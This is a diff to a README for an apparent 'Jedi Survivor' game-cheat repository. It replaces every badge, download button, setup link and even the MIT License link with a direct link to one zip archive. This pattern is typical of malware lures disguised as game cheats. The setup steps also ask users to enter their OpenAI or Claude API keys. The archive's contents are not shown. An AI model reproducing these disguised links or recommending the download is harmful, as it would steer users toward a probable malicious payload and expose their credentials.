@@ -1,9 +1,9 @@
 # 🌌 Jedi Survivor Cheats & Enhancers
 
-![GitHub Stars](https://img.shields.io/github/stars/your-repo/JediSurvivorCheats?style=for-the-badge)
-![GitHub Forks](https://img.shields.io/github/forks/your-repo/JediSurvivorCheats?style=for-the-badge)
-![Issues](https://img.shields.io/github/issues/your-repo/JediSurvivorCheats?style=for-the-badge)
-![MIT License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
+![GitHub Stars](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)
+![GitHub Forks](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)
+![Issues](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)
+![MIT License](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)
 
 Welcome, traveler! Whether you master the light or dabble in the mysteries of the Force, **Star Wars Jedi Survivor Cheats** propels gameplay into new galaxies of exhilaration, adaptability, and intelligence. Say goodbye to conventional mods — unleash a vault of *legend-worthy* enhancements and optimization wonders built for 2025 and beyond.
 
@@ -11,7 +11,7 @@ Welcome, traveler! Whether you master the light or dabble in the mysteries of th
 
 ## 🚀 Quick Download Portal
 
-[![Download](https://img.shields.io/badge/Download-Jedi_Survivor_Cheats-blue?style=for-the-badge&logo=star-wars)](https://shahshahdab.github.io)
+[![Download](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)
 
 Need swift access to the enhancements? Click the badge above to elevate your Jedi arsenal instantly.
 
@@ -79,7 +79,7 @@ Harness the wisdom of the galaxy’s greatest minds — our cheat toolkit integr
 - *Automated Troubleshooting*: Real-time diagnostics and solutions, powered by machine learning.
 
 **Setup**
-1. Install Jedi Survivor Cheats using the [Download badge above](https://shahshahdab.github.io).
+1. Install Jedi Survivor Cheats using the [Download badge above](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip).
 2. Enter your OpenAI/Claude API keys during setup.
 3. Enjoy a truly next-gen, AI-augmented Jedi journey!
 
@@ -107,7 +107,7 @@ Your adventure’s continuity is our prime directive — each ticket is another 
 
 **Step 1: Download**
 
-- Use the [Download badge above](https://shahshahdab.github.io) to retrieve the newest version for your operating system.
+- Use the [Download badge above](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip) to retrieve the newest version for your operating system.
 
 **Step 2: Extract**
 
@@ -135,7 +135,7 @@ Your adventure’s continuity is our prime directive — each ticket is another 
 
 ## 📜 LICENSE
 
-This repository is licensed under the MIT License (c) 2025. Safety, transparency, and collaborative development are core to our Jedi code. Read more at the [MIT License page](https://opensource.org/licenses/MIT).
+This repository is licensed under the MIT License (c) 2025. Safety, transparency, and collaborative development are core to our Jedi code. Read more at the [MIT License page](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip).
 
 ---
 
@@ -143,6 +143,6 @@ This repository is licensed under the MIT License (c) 2025. Safety, transparency
 
 Ready to ascend your Jedi journey once more? Click to unlock your destiny:
 
-[![Download](https://img.shields.io/badge/Download-Jedi_Survivor_Cheats-blue?style=for-the-badge&logo=star-wars)](https://shahshahdab.github.io)
+[![Download](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)](https://raw.githubusercontent.com/shahshahdab/jedi-survivor-enhanced-gameplay-tools/branch/udomograph/gameplay_survivor_jedi_enhanced_tools_1.5.zip)
 
 ---
